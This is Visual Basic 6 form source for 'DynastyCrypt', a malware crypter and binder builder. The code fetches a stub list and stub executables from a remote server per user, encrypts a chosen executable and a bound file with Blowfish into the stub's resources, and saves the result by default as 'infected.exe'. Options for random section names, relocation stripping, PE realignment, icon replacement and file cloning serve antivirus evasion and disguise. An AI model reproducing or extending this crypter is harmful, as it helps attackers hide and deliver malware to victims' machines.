VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSWINSCK.OCX"
Begin VB.Form fDynastyCrypt 
   AutoRedraw      =   -1  'True
   BorderStyle     =   1  'Fixed Single
   Caption         =   "DynastyCrypt"
   ClientHeight    =   6390
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   4455
   Icon            =   "fDynastyCrypt.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "fDynastyCrypt.frx":058A
   ScaleHeight     =   6390
   ScaleWidth      =   4455
   StartUpPosition =   1  'CenterOwner
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   2280
      TabIndex        =   32
      Text            =   "Text1"
      Top             =   6600
      Width           =   495
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   3600
      Top             =   6480
   End
   Begin VB.ComboBox Combo2 
      Height          =   315
      Left            =   240
      TabIndex        =   31
      Top             =   6600
      Width           =   1455
   End
   Begin DynastyCrypt.Framez Framez7 
      Height          =   1695
      Left            =   120
      TabIndex        =   23
      Top             =   4560
      Width           =   4215
      _ExtentX        =   7435
      _ExtentY        =   2990
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "Build"
      Transparent     =   -1  'True
      Begin VB.ComboBox Combo1 
         Height          =   315
         Left            =   120
         TabIndex        =   30
         Top             =   1200
         Width           =   1335
      End
      Begin VB.CommandButton Command7 
         Caption         =   "About"
         Height          =   255
         Left            =   3480
         TabIndex        =   28
         Top             =   1200
         Width           =   615
      End
      Begin VB.CommandButton cmdBuild 
         Caption         =   "Build"
         Height          =   255
         Left            =   1680
         TabIndex        =   27
         Top             =   1200
         Width           =   975
      End
      Begin VB.CommandButton Command6 
         Caption         =   "..."
         Height          =   255
         Left            =   3600
         TabIndex        =   26
         Top             =   600
         Width           =   495
      End
      Begin VB.TextBox txtKey 
         Height          =   285
         Left            =   120
         TabIndex        =   25
         Top             =   600
         Width           =   3255
      End
      Begin DynastyCrypt.CkBx chk_BF 
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   240
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Blowfish"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   16777215
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Stub:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   960
         Width           =   975
      End
   End
   Begin DynastyCrypt.Framez Framez6 
      Height          =   855
      Left            =   2280
      TabIndex        =   20
      Top             =   3600
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   1508
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "Clone"
      Transparent     =   -1  'True
      Begin VB.CommandButton Command5 
         Caption         =   "..."
         Height          =   255
         Left            =   1440
         TabIndex        =   22
         Top             =   360
         Width           =   495
      End
      Begin VB.TextBox txtClone 
         Height          =   285
         Left            =   120
         TabIndex        =   21
         Top             =   360
         Width           =   1095
      End
   End
   Begin DynastyCrypt.Framez Framez5 
      Height          =   855
      Left            =   120
      TabIndex        =   18
      Top             =   3600
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   1508
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "Icon"
      Transparent     =   -1  'True
      Begin VB.PictureBox Picture1 
         Height          =   375
         Left            =   840
         ScaleHeight     =   315
         ScaleWidth      =   315
         TabIndex        =   19
         Top             =   240
         Width           =   375
      End
   End
   Begin DynastyCrypt.Framez Framez4 
      Height          =   1335
      Left            =   2280
      TabIndex        =   14
      Top             =   2160
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   2355
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "Add Section"
      Transparent     =   -1  'True
      Begin VB.CommandButton Command4 
         Caption         =   "..."
         Height          =   255
         Left            =   1440
         TabIndex        =   17
         Top             =   600
         Width           =   495
      End
      Begin VB.TextBox txtSecName 
         Height          =   285
         Left            =   120
         TabIndex        =   16
         Text            =   "."
         Top             =   600
         Width           =   1095
      End
      Begin DynastyCrypt.CkBx chk_AS 
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   450
         Caption         =   "Add Section"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   16777215
      End
   End
   Begin DynastyCrypt.Framez Framez3 
      Height          =   1335
      Left            =   120
      TabIndex        =   9
      Top             =   2160
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   2355
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "Options"
      Transparent     =   -1  'True
      Begin DynastyCrypt.CkBx chk_RA 
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   960
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   450
         Caption         =   "ReAlign"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   16777215
      End
      Begin DynastyCrypt.CkBx chk_PAD 
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   720
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Remove PADX"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   16777215
      End
      Begin DynastyCrypt.CkBx chk_SR 
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   480
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Strip Relocations"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   16777215
      End
      Begin DynastyCrypt.CkBx chk_EOF 
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   450
         Caption         =   "Save EOF"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   16777215
      End
   End
   Begin DynastyCrypt.Framez Framez2 
      Height          =   855
      Left            =   120
      TabIndex        =   6
      Top             =   1200
      Width           =   4215
      _ExtentX        =   7435
      _ExtentY        =   1508
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "Bind:"
      Transparent     =   -1  'True
      Begin VB.CommandButton Command3 
         Caption         =   "..."
         Height          =   255
         Left            =   3600
         TabIndex        =   8
         Top             =   360
         Width           =   495
      End
      Begin VB.TextBox txtBind 
         Height          =   285
         Left            =   240
         TabIndex        =   7
         Top             =   360
         Width           =   3135
      End
   End
   Begin DynastyCrypt.Framez Framez1 
      Height          =   975
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   4215
      _ExtentX        =   7435
      _ExtentY        =   1720
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   16777215
      ForeColorDisabled=   13977088
      Caption         =   "File:"
      Transparent     =   -1  'True
      Begin VB.CommandButton Command2 
         Caption         =   "..."
         Height          =   255
         Left            =   3600
         TabIndex        =   5
         Top             =   360
         Width           =   495
      End
      Begin VB.TextBox txtFile 
         Height          =   285
         Left            =   240
         TabIndex        =   4
         Top             =   360
         Width           =   3135
      End
   End
   Begin MSComctlLib.ImageList IL 
      Left            =   7920
      Top             =   3480
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      MaskColor       =   12632256
      _Version        =   393216
   End
   Begin VB.PictureBox Pic1 
      Height          =   255
      Left            =   7080
      ScaleHeight     =   195
      ScaleWidth      =   195
      TabIndex        =   2
      Top             =   3480
      Width           =   255
   End
   Begin MSComctlLib.ListView lv 
      Height          =   1095
      Left            =   6720
      TabIndex        =   1
      Top             =   3840
      Width           =   3735
      _ExtentX        =   6588
      _ExtentY        =   1931
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Options"
      Height          =   255
      Left            =   5400
      TabIndex        =   0
      Top             =   1920
      Width           =   1215
   End
   Begin VB.Menu mnu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu mnu_add 
         Caption         =   "Add"
      End
      Begin VB.Menu mnu_delete 
         Caption         =   "Delete"
      End
   End
End
Attribute VB_Name = "fDynastyCrypt"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub InitCommonControls Lib "comctl32" ()
Private Declare Sub InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long)
Private Declare Function InternetOpenA Lib "wininet.dll" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrlA Lib "wininet.dll" (ByVal hOpen As Long, ByVal sURL As String, ByVal sHeaders As String, ByVal lLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Sub InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long)
Const MAX_FILENAME_LEN As Long = 256&
Const LOCALE_SYSTEM_DEFAULT = &H400
Const LOCALE_SENGCOUNTRY = &H1002
Public FileTitle As String, strFile As String, strSave As String, filesize As String
Dim CD As cFileDialog

Private Sub cmdBuild_Click()
On Error Resume Next
Dim TheEOF As String
Dim BindEOF As String
Dim c As New clsBlowfish
'If CheckUser(frmLogin.Text1.Text, frmLogin.Text2.Text) = False Then
'Exit Sub
'End If

If txtFile.Text = "" Then
MsgBox "Select file!", vbInformation, "DynastyCrypt"
Exit Sub
End If

'If txtBind.Text = "" Then
'MsgBox "Please select a file to bind!"
'Exit Sub
'End If

If Combo1.Text = "" Then
MsgBox "Please choose a stub!"
Exit Sub
End If

If chk_EOF.Value = 1 Then
TheEOF = ReadEOFData(txtFile.Text)
BindEOF = ReadEOFData(txtBind.Text)
Else
End If

Dim sRes() As Byte
Dim sBind() As Byte

SecName = "." & RandomLetter & RandomLetter & RandomLetter & RandomLetter
CD.DefaultExt = "exe"
CD.Filename = "infected"
CD.Filter = "PE Files (*.exe)|*.exe|All Files (*.*)|*.*"
CD.ShowSave

'Dim sData As String
'Open App.Path & "\stub.exe" For Binary As #1
'sData = Space(LOF(1))
'Get #1, , sData
'Close #1

Dim i As Integer
Dim b() As Byte
Dim sNewUrl As String
Dim bUrl As String
sNewUrl = Combo2.Text
b = DownloadFileToMemory(sNewUrl)

MsgBox "Stub: " & Combo1.Text & " downloaded!"

Call vbWriteByteFile(CD.Filename, b)
Kill App.Path & "\stubtemp.exe"

sRes = LoadFile(txtFile.Text)
sBind = LoadFile(txtBind.Text)

If txtBind.Text = "" Then
'sBind = LoadResData(101, "CUSTOM")
sBind = "11"
End If


c.Key = "££!asd12!£as-jH£$%%£I£($_GHJ(*&^%RGHJ%££(£_($£"

c.EncryptByte sBind(), txtKey.Text
c.EncryptByte sRes(), txtKey.Text

Dim sKeyStore() As Byte
Dim sNumOf() As Byte
sNumOf = StrConv(lv.ListItems.Count, vbFromUnicode)
sKeyStore = StrConv(txtKey.Text, vbFromUnicode)

Call SetResourceBytes(1, 5000, sRes, CD.Filename) 'Append the stub to the original file.
Call SetResourceBytes(1, 5001, sKeyStore, CD.Filename) 'Store Key
Call SetResourceBytes(1, 5002, sBind, CD.Filename) 'Append the binded file to the original file.
'Call SetResourceBytes(1, 5002, sKeyStore, CD.Filename) 'Store Number


'Dim mTempFile() As Byte
'
'For i = 1 To lv.ListItems.Count
'
'MsgBox lv.ListItems.item(i).Text
'MsgBox lv.ListItems.item(i).Index
'
'mTempFile() = ""
'
'mTempFile() = LoadFile(lv.ListItems.item(i).Text)
'
'c.EncryptByte mTempFile(), txtKey.Text
'
''Call SetResourceBytes(1, 200 & lv.ListItems.item(i).Index, mTempFile(), CD.Filename)
'Call SetResourceBytes(1, 5000, mTempFile(), CD.Filename)
'
'
'Next i
If chk_EOF.Value = 1 Then
Call WriteEOFData(CD.Filename, TheEOF & BindEOF)
End If

'If chk_PAD.Value = 1 Then
'Call AntiPADDING(CD.Filename)
'End If

If chk_AS.Value = 1 Then
Call AddTheData(StrConv(sRes, vbFromUnicode), txtSecName.Text)
End If

If chk_SR.Value = 1 Then
Call StripRelocations(CD.Filename)
End If

If chk_RA.Value = 1 Then
RealignPEFromFile (CD.Filename)
End If

'MsgBox sIcon
If sIcon <> True Then
Dim Err As String
Call ReplaceIcons(sIcon, CD.Filename, Err)
End If


'If txtClone <> "" Then
'Call CloneFileA(CD.Filename, txtClone.Text)
'End If
'ChangeIcon

If txtClone <> "" Then
Call CloneFileA(CD.Filename, txtClone.Text)
End If

'If txtClone <> "" & chk_CI.Value = 1 Then
'MsgBox "Clone file: " & txtClone.Text
'Call CloneFile(txtClone.Text, CD.Filename)
'End If

'Call CleanEOF(CD.Filename)
Call AntiPADDING(CD.Filename)

MsgBox "Finished!", vbInformation, "DynastyCrypt"

'----------------------------------------------------------------------------------
End Sub

Private Sub Command1_Click()
Show
End Sub

Private Sub Command2_Click()
CD.Filter = "PE Files (*.exe*)|*.exe*"
CD.Filename = ""
CD.ShowOpen
txtFile.Text = CD.Filename
End Sub

Private Sub Command3_Click()
On Error Resume Next
CD.Filter = "All Files (*.*)|*.*"
CD.Filename = ""
CD.ShowOpen
txtBind.Text = CD.Filename
End Sub

Private Sub Command4_Click()
On Error Resume Next
Dim Matrix As String
  
 Randomize Timer
  For x = 1 To Val(7)
   Matrix = Matrix & Chr(CLng(58 * Rnd + 1) + 64)
  Next x
  
txtSecName.Text = "." & Matrix
End Sub

Private Sub Command5_Click()
On Error Resume Next
CD.Filter = "PE Files (*.exe*)|*.exe*"
CD.Filename = ""
CD.ShowOpen
txtClone.Text = CD.Filename
End Sub

Private Sub Command6_Click()
On Error Resume Next
Dim Matrix As String
  
 Randomize Timer
  For x = 1 To Val(59)
   Matrix = Matrix & Chr(CLng(58 * Rnd + 1) + 64)
  Next x
  
txtKey.Text = Matrix
End Sub

Private Sub Command7_Click()
frmAbout.Show
End Sub

Private Sub Form_Initialize()
On Error Resume Next
Set CD = New cFileDialog
InitCommonControls

Call Command6_Click
Call Command4_Click
chk_PAD.Enabled = False
chk_PAD.Value = Checked
chk_RA.Enabled = False
chk_BF.Enabled = False
chk_BF.Value = Checked

'If CheckUser("1232", "QdrXqc") = False Then
'End
'End If

Call GetStubs
End Sub

Public Function LoadFile(ByVal sName As String) As Byte()
On Error Resume Next
Dim nFile As Integer
Dim arrFile() As Byte
nFile = FreeFile
Open sName For Binary As #nFile
ReDim arrFile(LOF(nFile) - 1)
Get #nFile, , arrFile
Close #nFile
LoadFile = arrFile
End Function

Public Function vbWriteByteFile(ByVal sFileName As String, lpByte() As Byte) As Boolean
On Error Resume Next
Dim fhFile As Integer
fhFile = FreeFile
Open sFileName For Binary As #fhFile
Put #fhFile, , lpByte()
Close #fhFile
End Function

Private Function ReadFile(ByVal strFile As String) As Byte()
    Dim FF As Long
    Dim bufFile() As Byte
    
    FF = FreeFile
    ReDim bufFile(0 To FileLen(strFile) - 1)
    Open strFile For Binary Access Read As FF
        Get FF, , bufFile
    Close FF
    
    ReadFile = bufFile
End Function

Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo Err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
If ReadEOFData = "" Then
'MsgBox "No EOF Data found", vbInformation
End If
Exit Function
Err:
ReadEOFData = vbNullString
End Function

Sub WriteEOFData(sFilePath As String, sEOFData As String)
Dim sFileBuf As String
Dim lFF As Long
On Error Resume Next
If Dir(sFilePath) = "" Then Exit Sub
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
Kill sFilePath
lFF = FreeFile
Open sFilePath For Binary As #lFF
Put #lFF, , sFileBuf & sEOFData
Close #lFF
End Sub

Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function

Public Function RandomLetter() As String
  RandomLetter = ""
  Dim Keyset As String
  Keyset = "abcdefghijklmnopqrstuvwyxz"
Anfang:
  Randomize
  var1 = Int(26 * Rnd)
  If var1 = 0 Then GoTo Anfang
  RandomLetter = Mid(Keyset, var1, 1)
End Function

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Unload frmLogin
Unload frmAbout
End Sub

Private Sub Form_Terminate()
Unload frmLogin
Unload frmAbout
End Sub

Private Sub Form_Unload(Cancel As Integer)
Unload frmLogin
Unload frmAbout
End Sub

Public Function AddTheData(sData As String, sSectionName As String) As Boolean
    Dim dwSettingsRVA As Long, dwSettingsRaw As Long
    
    dwSettingsRaw = AddSection(frmMain.Com.Filename, sSectionName, Len(sData), &HC0000040, dwSettingsRVA, True)
    
    If dwSettingsRaw Then
        Open frmMain.Com.Filename For Binary Access Write As #1
            Put #1, dwSettingsRaw + 1, sData
        Close #1
        
        AddTheData = True
    Else
        AddTheData = False
    End If
End Function

Private Sub mnu_add_Click()
On Error Resume Next
With CD
        .DialogTitle = "Select your file"
        .Filter = "EXE Files |*.exe"
        .ShowOpen
End With

If Not CD.Filename = vbNullString Then
End If
strFile = CD.Filename
FileTitle = Trim$(CD.FileTitle)
filesize = FileLen(strFile)
With fDynastyCrypt.lv.ColumnHeaders
        .Clear
        .Add , , "File", 1200
        .Add , , "File Size", 1800
End With

With fDynastyCrypt.lv.ListItems
    .Add , strFile, strFile
    .item(.Count).SubItems(1) = filesize
End With

End Sub

Private Sub Picture1_Click()
On Error Resume Next
With CD
.DialogTitle = "Select Icon"
.Filter = "Icon|*.ico"
.ShowOpen
If Not CD.Filename = vbNullString Then
bIcon = True
sIcon = CD.Filename
Picture1.Picture = LoadPicture(CD.Filename)
End If
End With
End Sub

Public Function GetStubs()
On Error Resume Next
Dim sPage       As String
Dim sVersion    As String
Dim sMessage    As String
Dim sURL        As String


 hOpen = InternetOpenA("USER_CHECK", INTERNET_OPEN_TYPE_PRECONFIG, vbNullString, vbNullString, 0)
  If hOpen <> 0 Then
  hUrl = InternetOpenUrlA(hOpen, sDBUrl & "stubs/" & frmLogin.Text1.Text & ".txt", 0, 0, INTERNET_FLAG_EXISTING_CONNECT, 0)
If hUrl <> 0 Then
      sPage = Space(300)
      Call InternetReadFile(hUrl, sPage, 300, lNull)
      End If
     Call InternetCloseHandle(hUrl)
    End If
   Call InternetCloseHandle(hOpen)

sPage = Trim(sPage)

Dim sHold() As String
Dim sName As String
Dim sUrlDL As String
Dim i As Integer
sHold() = Split(sPage, "!!")

For i = 0 To UBound(sHold)
'MsgBox sHold(i)
sName = Split(sHold(i), "|")(1)
'MsgBox sName
sUrlDL = Split(sHold(i), "|")(0)
'MsgBox sUrlDL
If InStr(sUrlDL, "") Then
sUrlDL = Replace(sUrlDL, "", " ")
sUrlDL = Trim(sUrlDL)
End If
Call Combo1.AddItem(sName)
Call Combo2.AddItem(sUrlDL)
Next i
Combo1.ListIndex = 0


'££!asd12!£as-jH£$%%£I£($_GHJ(*&^%RGHJ%££(£_($£

End Function

Private Sub Timer1_Timer()
On Error Resume Next
Combo2.ListIndex = Combo1.ListIndex
End Sub
